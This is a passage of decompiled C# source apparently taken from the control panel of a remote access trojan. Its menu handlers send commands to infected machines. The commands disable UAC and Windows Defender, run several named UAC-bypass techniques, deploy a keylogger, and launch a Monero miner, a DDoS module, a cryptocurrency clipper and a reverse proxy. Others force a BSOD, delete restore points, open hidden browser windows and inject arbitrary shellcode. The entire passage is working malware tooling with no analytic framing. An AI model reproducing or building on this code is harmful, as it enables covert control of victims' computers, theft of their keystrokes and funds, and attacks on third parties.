		private void disableUACToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			byte[] pack = LEB128.Write(new object[]
			{
				"DisableUAC"
			});
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600010E RID: 270 RVA: 0x0000CC90 File Offset: 0x0000AE90
		private void disableWDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			byte[] pack = LEB128.Write(new object[]
			{
				"DisableDefedner"
			});
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600010F RID: 271 RVA: 0x0000CD1C File Offset: 0x0000AF1C
		private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			byte[] pack = LEB128.Write(new object[]
			{
				"Shutdown"
			});
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0000CDA8 File Offset: 0x0000AFA8
		private void restartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			byte[] pack = LEB128.Write(new object[]
			{
				"Restart"
			});
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000111 RID: 273 RVA: 0x0000CE34 File Offset: 0x0000B034
		private void logOutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			byte[] pack = LEB128.Write(new object[]
			{
				"Logoff"
			});
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000112 RID: 274 RVA: 0x0000CEC0 File Offset: 0x0000B0C0
		private void botKillerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\BotKiller.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}

		// Token: 0x06000113 RID: 275 RVA: 0x0000CF34 File Offset: 0x0000B134
		private void minerXMRToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (!this.MinerXMR.Visible && this.MinerXMR.work)
			{
				this.MinerXMR.Show();
			}
			if (!this.MinerXMR.work)
			{
				this.MinerXMR.Show();
				this.MinerXMR.work = true;
				string checksum = Methods.GetChecksum("Plugin\\MinerXMR.dll");
				Clients[] array = this.ClientsAll();
				for (int i = 0; i < array.Length; i++)
				{
					Clients clients = array[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000114 RID: 276 RVA: 0x0000CFDC File Offset: 0x0000B1DC
		private void dDOSPanelToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (!this.DDos.Visible && this.DDos.work)
			{
				this.DDos.Show();
			}
			if (!this.DDos.work)
			{
				this.DDos.Show();
				this.DDos.work = true;
				string checksum = Methods.GetChecksum("Plugin\\DDos.dll");
				Clients[] array = this.ClientsAll();
				for (int i = 0; i < array.Length; i++)
				{
					Clients clients = array[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000115 RID: 277 RVA: 0x0000D084 File Offset: 0x0000B284
		private void clipperPanelToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!this.Clipper.Visible && this.Clipper.work)
			{
				this.Clipper.Show();
			}
			if (!this.Clipper.work)
			{
				this.Clipper.Show();
				this.Clipper.work = true;
				string checksum = Methods.GetChecksum("Plugin\\Clipper.dll");
				Clients[] array = this.ClientsAll();
				for (int i = 0; i < array.Length; i++)
				{
					Clients clients = array[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000116 RID: 278 RVA: 0x0000D12C File Offset: 0x0000B32C
		private void runAsAdminUacToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"runas"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000117 RID: 279 RVA: 0x0000D1B8 File Offset: 0x0000B3B8
		private void runAsSystemToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"runassystem"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000118 RID: 280 RVA: 0x0000D244 File Offset: 0x0000B444
		private void eventvwrToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Eventvwr"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000119 RID: 281 RVA: 0x0000D2D0 File Offset: 0x0000B4D0
		private void fodhelperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Fodhelper"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600011A RID: 282 RVA: 0x0000D35C File Offset: 0x0000B55C
		private void computerdefaultsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Computerdefaults"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600011B RID: 283 RVA: 0x0000D3E8 File Offset: 0x0000B5E8
		private void sDCLTToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"SDCLT"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600011C RID: 284 RVA: 0x0000D474 File Offset: 0x0000B674
		private void sLUIToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"SLUI"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600011D RID: 285 RVA: 0x0000D500 File Offset: 0x0000B700
		private void diskCleanupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"DiskCleanup"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600011E RID: 286 RVA: 0x0000D58A File Offset: 0x0000B78A
		private void clearToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.GridLogs.Rows.Clear();
		}

		// Token: 0x0600011F RID: 287 RVA: 0x0000D59C File Offset: 0x0000B79C
		private void proxyRPanelToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!this.ReverseProxyR.Visible && this.ReverseProxyR.work)
			{
				this.ReverseProxyR.Show();
			}
			if (!this.ReverseProxyR.work)
			{
				this.ReverseProxyR.Show();
				this.ReverseProxyR.work = true;
				string checksum = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
				byte[] pack = LEB128.Write(new object[]
				{
					"Pack",
					"ReverseProxyR"
				});
				Clients[] array = this.ClientsAll();
				for (int i = 0; i < array.Length; i++)
				{
					Clients clients = array[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							pack
						});
					});
				}
			}
		}

		// Token: 0x06000120 RID: 288 RVA: 0x0000D668 File Offset: 0x0000B868
		private void windowToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Window.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormWindow)Application.OpenForms["Window:" + clients.Hwid] == null)
				{
					new FormWindow
					{
						Name = "Window:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000121 RID: 289 RVA: 0x0000D738 File Offset: 0x0000B938
		private void keyLoggerSetupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			if (!File.Exists("Stub\\KeyLogger.exe"))
			{
				return;
			}
			byte[] pack = LEB128.Write(new object[]
			{
				"SendDisk",
				".exe",
				File.ReadAllBytes("Stub\\KeyLogger.exe")
			});
			string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000122 RID: 290 RVA: 0x0000D7E4 File Offset: 0x0000B9E4
		private void keyLoggerDownloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\KeyLoggerPanel.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormKeyLoggerPanel)Application.OpenForms["KeyLoggerPanel:" + clients.Hwid] == null)
				{
					new FormKeyLoggerPanel
					{
						Name = "KeyLoggerPanel:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000123 RID: 291 RVA: 0x0000D8B4 File Offset: 0x0000BAB4
		private void programsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Programs.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormPrograms)Application.OpenForms["Programs:" + clients.Hwid] == null)
				{
					new FormPrograms
					{
						Name = "Programs:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000124 RID: 292 RVA: 0x0000D984 File Offset: 0x0000BB84
		private void installNfx3ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Net3"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000125 RID: 293 RVA: 0x0000DA10 File Offset: 0x0000BC10
		private void toolStripMenuItem16_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Regedit+"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000126 RID: 294 RVA: 0x0000DA9C File Offset: 0x0000BC9C
		private void toolStripMenuItem17_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Regedit-"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000127 RID: 295 RVA: 0x0000DB28 File Offset: 0x0000BD28
		private void toolStripMenuItem10_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"TaskMgr+"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000128 RID: 296 RVA: 0x0000DBB4 File Offset: 0x0000BDB4
		private void toolStripMenuItem14_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"TaskMgr-"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000129 RID: 297 RVA: 0x0000DC40 File Offset: 0x0000BE40
		private void toolStripMenuItem7_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Uac+"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600012A RID: 298 RVA: 0x0000DCCC File Offset: 0x0000BECC
		private void toolStripMenuItem8_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Uac-"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600012B RID: 299 RVA: 0x0000DD58 File Offset: 0x0000BF58
		private void toolStripMenuItem19_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Firewall+"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600012C RID: 300 RVA: 0x0000DDE4 File Offset: 0x0000BFE4
		private void toolStripMenuItem20_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Firewall-"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600012D RID: 301 RVA: 0x0000DE70 File Offset: 0x0000C070
		private void enableToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Cmd+"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600012E RID: 302 RVA: 0x0000DEFC File Offset: 0x0000C0FC
		private void disableToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Cmd-"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600012F RID: 303 RVA: 0x0000DF88 File Offset: 0x0000C188
		private void deletePointsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"DeletePoints"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000130 RID: 304 RVA: 0x0000E014 File Offset: 0x0000C214
		private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"BSOD"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000131 RID: 305 RVA: 0x0000E0A0 File Offset: 0x0000C2A0
		private void toolStripMenuItem25_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Update+"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000132 RID: 306 RVA: 0x0000E12C File Offset: 0x0000C32C
		private void toolStripMenuItem26_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Update-"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000133 RID: 307 RVA: 0x0000E1B8 File Offset: 0x0000C3B8
		private void toolStripMenuItem22_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"WinR+"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000134 RID: 308 RVA: 0x0000E244 File Offset: 0x0000C444
		private void toolStripMenuItem23_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"WinR+"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000135 RID: 309 RVA: 0x0000E2D0 File Offset: 0x0000C4D0
		private void toolStripMenuItem28_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Defender+"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000136 RID: 310 RVA: 0x0000E35C File Offset: 0x0000C55C
		private void toolStripMenuItem29_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Defender-"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000137 RID: 311 RVA: 0x0000E3E8 File Offset: 0x0000C5E8
		private void toolStripMenuItem30_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Clipboard.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormClipboard)Application.OpenForms["Clipboard:" + clients.Hwid] == null)
				{
					new FormClipboard
					{
						Name = "Clipboard:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000138 RID: 312 RVA: 0x0000E4B8 File Offset: 0x0000C6B8
		private void vIsbleToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			FormInput formInput = new FormInput();
			formInput.Text = "Url";
			formInput.rjTextBox1.PlaceholderText = "https://example.com/";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				byte[] pack = LEB128.Write(new object[]
				{
					"OpenLink",
					formInput.rjTextBox1.Texts
				});
				string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
				Clients[] array = this.ClientsSelected();
				for (int i = 0; i < array.Length; i++)
				{
					Clients clients = array[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							pack
						});
					});
				}
			}
		}

		// Token: 0x06000139 RID: 313 RVA: 0x0000E580 File Offset: 0x0000C780
		private void invisibleToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			FormInput formInput = new FormInput();
			formInput.Text = "Url";
			formInput.rjTextBox1.PlaceholderText = "https://example.com/";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				byte[] pack = LEB128.Write(new object[]
				{
					"OpenLinkInv",
					formInput.rjTextBox1.Texts
				});
				string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
				Clients[] array = this.ClientsSelected();
				for (int i = 0; i < array.Length; i++)
				{
					Clients clients = array[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							pack
						});
					});
				}
			}
		}

		// Token: 0x0600013A RID: 314 RVA: 0x0000E648 File Offset: 0x0000C848
		private void botSpeakerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\BotSpeaker.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormSpeakerBot)Application.OpenForms["BotSpeaker:" + clients.Hwid] == null)
				{
					new FormSpeakerBot
					{
						Name = "BotSpeaker:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x0600013B RID: 315 RVA: 0x0000E718 File Offset: 0x0000C918
		private void shellCodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					byte[] pack = LEB128.Write(new object[]
					{
						"ShellCode",
						File.ReadAllBytes(openFileDialog.FileName)
					});
					string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
					Clients[] array = this.ClientsSelected();
					for (int i = 0; i < array.Length; i++)
					{
						Clients clients = array[i];
						System.Threading.Tasks.Task.Run(delegate()
						{
							clients.Send(new object[]
							{
								"Invoke",
								checksum,
								pack
							});
						});
					}
				}
			}
		}

		// Token: 0x0600013C RID: 316 RVA: 0x0000E7E0 File Offset: 0x0000C9E0
